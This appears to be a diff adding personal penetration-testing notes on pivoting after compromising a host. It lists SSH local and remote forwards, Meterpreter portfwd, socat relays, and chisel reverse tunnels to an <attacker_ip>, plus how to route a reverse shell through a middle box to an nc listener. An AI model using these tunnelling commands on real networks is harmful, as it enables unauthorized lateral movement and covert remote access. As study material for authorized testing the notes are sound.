@@ -1,0 +1,54 @@
+After getting an access to the target I discovered internal services on the localhost or services on another IP; in order to access those services I need to perform port forwarding via:
+
+
+SSH (on my terminal – requires credentials)
+Ssh –L 5555:<victim_ip>:5555 <ssh_credentials>
+
+SSH (on victim terminal)
+~C
+Ssh>-L 5555:<victim_ip>:5555
+
+All traffic from the port 5555 on the victim IP redirect to the port 5555 on my attacker’s machine, after that in the browser http://127.0.0.1:5555 and I can see the forwarded service
+
+
+Meterpreter
+Meterpreter> portfwd add –l <my_port> -p <interestig_port> -r <vicitm_ip>
+
+./socat tcp-listen:5555,reuseaddr, fork tcp:<victim_ip>:<interesting_port>
+
+Chisel 
+
+(on attacker terminal)
+
+.\chisel server –p 4444 –reverse
+
+(on victim)
+.\chisel client <attacker_ip>:4444 R:8001:<victim_ip>:8001
+
+All traffic from port 8001 on the victim_ip will be redirected to the port 8001 on my attacker’s machine, after that in the browser http://127.0.0.1:8001 and I can see the forwarded service
+
+
+I performed a port forwarding, explore the service and as the result of this exploration I got RCE on the internal box so now I want to get a full-fledged reverse shell but there is a problem … my attacker’s machine and the internal box don’t know how to talk to each other beyond the forwarded service but they do know how to talk to the box in the middle so I can use this box as the recipient of my reverse shell
+
+Via SSH
+Executed on the box in the middle
+~C
+Ssh> -R 5555:127.0.0.1:5555
+
+All traffic coming to the port 5555 on the box in the middle (it must be 127.0.0.1) will be redirected to the port 5555 on my attacker’s machine where ‘nc’ is listening
+
+Via chisel
+
+Executed on the box in the middle
+
+.\chisel client <attacker_ip>:4444  5555:127.0.0.1:5555  
+#no letter needed
+All traffic coming to the port 5555 on the box in the middle (it must be 127.0.0.1) will be redirected to the port 5555 on my attacker’s machine where ‘nc’ is listening
+
+
+In the combination like
+
+Attacker -> Box1 -> Box2 -> Box3
+
+Where interesting service in on the box 3, first of all I need to assure that my attacker’s machine can talk directly to the box2 what can be achieved by e.g if SSH is open on the box2 I can forward this service and then SSH directly from my attacker’s machine 
+
